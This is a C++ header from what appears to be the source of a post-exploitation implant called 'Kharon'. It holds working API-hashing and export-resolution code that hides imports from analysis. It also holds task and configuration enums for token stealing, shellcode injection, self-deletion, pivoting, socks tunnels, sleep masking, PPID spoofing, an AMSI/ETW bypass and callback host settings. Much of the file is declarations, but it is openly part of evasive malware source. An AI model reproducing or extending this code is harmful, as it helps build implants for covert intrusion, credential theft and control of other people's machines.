#ifndef MISC_H
#define MISC_H

#include <Kharon.h>

#define RSL_TYPE( x )   .x = reinterpret_cast<decltype( x )*>( Hsh::Str( #x ) ) 
#define RSL_API( m, f ) LdrLoad::Api<decltype(s)>( m, Hsh::Str( #f ) )

#define RSL_IMP( m ) { \
    for ( int i = 1; i < Hsh::StructCount<decltype( Kharon::m )>(); i++ ) { \
        reinterpret_cast<UPTR*>( &m )[ i ] = LdrLoad::_Api( m.Handle, reinterpret_cast<UPTR*>( &m )[ i ] ); \
    } \
}

auto Rnd32( VOID ) -> ULONG;
auto Guardrails( VOID ) -> BOOL;

namespace LdrLoad {
    auto Module(
        _In_ const ULONG LibHash
    ) -> UPTR;

    auto _Api(
        _In_ const UPTR ModBase,
        _In_ const UPTR SymbBase
    ) -> UPTR;

    template <typename T>
    inline auto Api(
        _In_ const UPTR ModBase,
        _In_ const UPTR SymbHash
    ) -> T* {
        return reinterpret_cast<T*>( _Api( ModBase, SymbHash ) );
    }
}

namespace Hsh {
    template <typename T>
    constexpr SIZE_T StructCount() {
        SIZE_T Count = 0;
        SIZE_T StructLen   = sizeof( T );

        while ( StructLen > Count * sizeof( UPTR ) ) {
            Count++;
        }

        return Count;
    }

    template <typename T = char>
    inline auto DECLFN Str(
        _In_ const T* String
    ) -> UPTR {
        ULONG CstHash = 0x515528a;
        BYTE  Value   = 0;

        while ( * String ) {
            Value = static_cast<BYTE>( *String++ );

            if ( Value >= 'a' ) {
                Value -= 0x20;
            }

            CstHash ^= Value;
            CstHash *= 0x01000193;
        }

        return CstHash;
    }

    template <typename T = char>
    constexpr auto XprStrA(
        const T* String
    ) -> UPTR {
        ULONG CstHash = 0x515528a;
        BYTE  Value   = 0;
    
        while ( * String ) {
            Value = static_cast<BYTE>( *String++ );
    
            if ( Value >= 'a' ) {
                Value -= 0x20;
            }
    
            CstHash ^= Value;
            CstHash *= 0x01000193;
        }
    
        return CstHash;
    }
}

namespace Mem {
    auto DECLFN Copy(
        _In_ PVOID Dst,
        _In_ PVOID Src,
        _In_ ULONG Size
    ) -> PVOID;

    auto DECLFN Set(
        _In_ UPTR Addr,
        _In_ UPTR Val,
        _In_ UPTR Size
    ) -> void;

    auto DECLFN Zero(
        _In_ UPTR Addr,
        _In_ UPTR Size
    ) -> void;
}

namespace Str {
    auto CompareWCountL(
        const wchar_t* str1,
        const wchar_t* str2,
        size_t count
    ) -> int;
    
    auto CompareCountW( 
        PCWSTR Str1, 
        PCWSTR Str2, 
        INT16  Count 
    ) -> INT;

    auto WCharToChar( 
        PCHAR  Dest, 
        PWCHAR Src, 
        SIZE_T MaxAllowed 
    ) -> SIZE_T;

    auto StartsWith(
        BYTE* Str, 
        BYTE* Prefix
    ) -> BOOL;

    auto CharToWChar( 
        PWCHAR Dest, 
        PCHAR  Src, 
        SIZE_T MaxAllowed 
    ) -> SIZE_T;

    auto LengthA( 
        LPCSTR String 
    ) -> SIZE_T;

    auto LengthW( 
        LPCWSTR String 
    ) -> SIZE_T;

    auto CompareCountA( 
        PCSTR Str1, 
        PCSTR Str2, 
        INT16 Count 
    ) -> INT;

    auto CompareA( 
        LPCSTR Str1, 
        LPCSTR Str2 
    ) -> INT;

    auto CompareW( 
        LPCWSTR Str1, 
        LPCWSTR Str2 
    ) -> INT;

    auto ToUpperChar(
        char* str
    ) -> VOID;

    auto ToLowerChar( 
        PCHAR Str
    ) -> VOID;

    auto ToLowerWchar( 
        WCHAR Ch 
    ) -> WCHAR;

    auto CopyA( 
        PCHAR  Dest, 
        LPCSTR Src 
    ) -> PCHAR;

    auto CopyW( 
        PWCHAR  Dest, 
        LPCWSTR Src 
    ) -> PWCHAR;

    auto ConcatA( 
        PCHAR  Dest, 
        LPCSTR Src 
    ) -> PCHAR;

    auto ConcatW( 
        PWCHAR  Dest, 
        LPCWSTR Src 
    ) -> PWCHAR;

    auto IsEqual( 
        LPCWSTR Str1, 
        LPCWSTR Str2 
    ) -> BOOL;

    auto InitUnicode( 
        PUNICODE_STRING UnicodeString, 
        PWSTR           Buffer 
    ) -> VOID;

    auto GenRnd( 
        ULONG StringSize
    ) -> PCHAR;
}

#define TSK_LENGTH ( Enm::Task::TaskLast - 10 ) 

namespace Enm {
    enum Job {
        List_j,
        Remove
    };

    enum Task {
        GetTask,
        PostReq,
        
        NoTask = 4,
        QuickMsg,
        Error,
        QuickOut,

        Checkin = 241,

        Config = 10,
        Process,
        FileSystem,
        Upload,
        Download,
        GetInfo,
        SelfDelete,
        Exit,
        Socks,
        ExecBof,
        Token,
        Pivot,
        PostEx,
        ScInject,
        Jobs,
        ProcessTunnels,
        ProcessDownloads,
        RPortfwd,
        TaskLast
    };

    enum PostXpl {
        Inline,
        Fork
    };

    enum Fork {
        Init_f,
        GetResp_f
    };

    enum Inline {
        Init_i,
        GetResp_i
    };

    enum Thread {
        Random,
        Target,
        Hwbp
    };

    enum Pivot {
        Link = 10,
        Unlink,
        List
    };

    enum Up {
        Init,
        Chunk
    };

    enum Config {
        Jitter = 14,
        Sleep,
        Mask,
        Sc,
        Pe,
        Ppid,
        BlockDlls,
        CurDir,
        Arg,
        Spawn,
        Killdate,
        Worktime,
        HeapObf,
        PexForkType,
        PexForkPid,
        KilldateExit,
        KilldateSelfdel,
        AmsiEtwBypass,
        AllocMtd,
        WriteMtd,
        Syscall,
        ForkPipeName,
        CallbackHost,
        CallbackUserAgt,
        CallbackProxy
    };

    enum Token {
        GetUUID = 10,
        Steal,
        Make,
        GetPriv,
        LsPriv,
        Impersonate,
        Remove_t,
        Revert,
        List_t
    };

    enum Exit {
        Thread = 20,
        Proc
    };

    enum Ps {
        ListPs = 20,
        Create,
        Kill
    };

    enum Fs {
        ListFl = 30,
        Read,
        Cwd,
        Move,
        Copy,
        MakeDir,
        Delete,
        ChangeDir
    };
}

EXTERN_C VOID volatile ___chkstk_ms( VOID );

#endif